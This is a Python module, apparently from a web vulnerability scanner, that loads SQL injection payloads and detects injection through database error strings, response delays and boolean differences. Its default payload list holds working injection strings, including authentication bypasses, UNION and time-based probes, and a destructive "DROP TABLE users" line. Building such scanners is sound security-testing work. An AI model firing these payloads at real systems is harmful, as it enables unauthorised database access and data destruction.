"""
SQL Injection Vulnerability Tester
"""

import asyncio
import json
from typing import List, Dict
from pathlib import Path
from .base_tester import BaseVulnerabilityTester


class SQLInjectionTester(BaseVulnerabilityTester):
    """Tests for SQL injection vulnerabilities"""
    
    def __init__(self, scanner_core, config, logger):
        super().__init__(scanner_core, config, logger)
        self._load_payloads()
    
    def _load_payloads(self):
        """Load SQL injection payloads from payloads_master.json"""
        try:
            # Intentar cargar de payloads_master.json primero
            master_file = Path(__file__).parent.parent.parent / 'PAYLOAD' / 'payloads_master.json'
            if master_file.exists():
                with open(master_file, 'r', encoding='utf-8') as f:
                    master_data = json.load(f)
                    sqli_data = master_data.get('SQLi', {})
                    # Extraer payloads del formato estructurado
                    self.payloads_list = []
                    for payload_obj in sqli_data.get('payloads', []):
                        content = payload_obj.get('content', {})
                        if 'raw' in content:
                            self.payloads_list.append(content['raw'])
                        if 'urlencoded' in content and content['urlencoded'] != content.get('raw'):
                            self.payloads_list.append(content['urlencoded'])
                    
                    if self.payloads_list:
                        self.logger.info(f"Loaded {len(self.payloads_list)} SQL payloads from payloads_master.json")
                        # Agregar también los payloads clásicos
                        self.payloads_list.extend(self._get_default_payloads())
                        return
            
            # Fallback a payloadsSQL.json
            payload_file = Path(__file__).parent.parent.parent / 'PAYLOAD' / 'payloadsSQL.json'
            with open(payload_file, 'r', encoding='utf-8') as f:
                self.payloads_list = json.load(f)
        except Exception as e:
            self.logger.warning(f"Could not load SQL payloads: {e}")
            self.payloads_list = self._get_default_payloads()
    
    def get_payloads(self) -> List[str]:
        """Get SQL injection payloads"""
        return self.payloads_list
    
    def _get_default_payloads(self) -> List[str]:
        """Default SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR '1'='1'--",
            "') OR ('1'='1'--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            "' AND 1=CONVERT(int, @@version)--",
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "'; WAITFOR DELAY '00:00:05'--",
            "1; SELECT SLEEP(5)--",
            "' AND SLEEP(5)--",
            "'; DROP TABLE users--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "1' GROUP BY 1--",
            "' OR EXISTS(SELECT * FROM users)--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
        ]
    
    def check_vulnerability(self, response, baseline, payload) -> bool:
        """Check if response indicates SQL injection"""
        if not response or not baseline:
            return False
        
        response_text = response.text.lower()
        
        # SQL error messages
        sql_errors = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "mysql_fetch",
            "mysql_num_rows",
            "mysql_query",
            "pg_query",
            "pg_exec",
            "syntax error",
            "ora-",
            "sqlite3::",
            "sqlstate",
            "microsoft ole db provider for sql server",
            "incorrect syntax near",
            "fatal error",
            "odbc sql server driver",
            "db2 sql error",
            "sybase message",
            "mysql server version for the right syntax",
            "supplied argument is not a valid mysql",
            "java.sql.sqlexception",
            "postgresql query failed",
            "unterminated string literal",
            "sql syntax error",
            "invalid query",
            "database error",
            "sql error",
        ]
        
        for error in sql_errors:
            if error in response_text:
                return True
        
        # Check for time-based SQL injection
        if any(keyword in payload.lower() for keyword in ['sleep', 'waitfor', 'delay']):
            if hasattr(response, 'elapsed'):
                response_time = response.elapsed.total_seconds()
                if response_time >= 4:  # 1 second margin
                    return True
        
        # Check for boolean-based SQL injection
        if self._response_differs_significantly(response, baseline):
            # Additional validation for SQL-specific patterns
            if any(keyword in payload.lower() for keyword in ['or', 'and', 'union', 'select']):
                return True
        
        return False
    
    def get_vulnerability_info(self) -> Dict[str, str]:
        """Return SQL injection vulnerability information"""
        return {
            'name': 'SQL Injection',
            'severity': 'critical',
            'description': 'The application is vulnerable to SQL injection, allowing attackers to manipulate database queries.',
            'cwe': 'CWE-89',
            'owasp': 'A03:2021 - Injection',
            'impact': 'Unauthorized data access, data modification, authentication bypass, and potential remote code execution.',
            'remediation': 'Use parameterized queries (prepared statements), input validation, and least privilege database accounts.'
        }
